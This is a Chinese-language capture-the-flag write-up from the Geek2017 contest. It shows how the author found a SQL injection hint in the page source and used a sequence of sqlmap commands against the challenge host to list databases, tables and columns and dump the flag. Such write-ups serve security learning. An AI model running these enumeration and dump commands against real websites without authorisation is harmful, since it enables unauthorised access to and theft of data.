###  2017-11-18

## Geek2017

# Clound的错误

#### 0x00 [原理]
     kali虚拟机下的命令运用，sqlmap的使用
#### 0x01 [目的]
     了解kali系统下sqlmap的使用
#### 0x02 [环境]
     kali
#### 0x03 [工具]
     sqlmap
#### 0x04 [步骤]

1.首先打开address，是一张可爱的图片啊啊啊啊～并没有什么提示

![](/files_for_wp/clound1.png)

2.右键查看源代码，有注入点的提示： sycid=1

![](/files_for_wp/clound2.png)

3.http://game.sycsec.com:2007/?sycid=1

![](/files_for_wp/clound3.png)

出现hint：select * from user where id='1'

4.使用sqlmap注入
  ①检测注入点是否可用:sqlmap -u "http://game.sycsec.com:2007/?sycid=1"  </br>

  ![](/files_for_wp/clound4.png)</br>

  ②暴库:sqlmap -u "http://game.sycsec.com:2007/?sycid=1" --dbs </br>

  ![](/files_for_wp/clound5.png)</br>

  库名：f1ag</br>

  ③暴表:sqlmap -u "http://game.sycsec.com:2007/?sycid=1" -D f1ag --tables</br>

  ![](/files_for_wp/clound6.png)</br>
  
  表名：flag</br>

  ④暴字段:sqlmap -u "http://game.sycsec.com:2007/?sycid=1" -D f1ag -T flag --columns</br>

  ![](/files_for_wp/clound7.png)</br>
  
  字段：f4ag </br>
  ⑤暴字段内容:sqlmap -u "http://game.sycsec.com:2007/?sycid=1" -D f1ag -T flag -C f4ag --dump</br>

  ![](/files_for_wp/clound8.png)</br>
  
  字段内容：SYC{Err0r_sql_inj}</br>

4.flag：SYC{Err0r_sql_inj}

#### 0x05 [总结]
    sqlmap使用

    详细可参考：(https://www.2cto.com/article/201208/151503.html)[手工注入] ， (http://blog.csdn.net/zgyulongfei/article/details/41017493)[sqlmap基本教程]

</br>
</br>
</br>
</br>
</br>






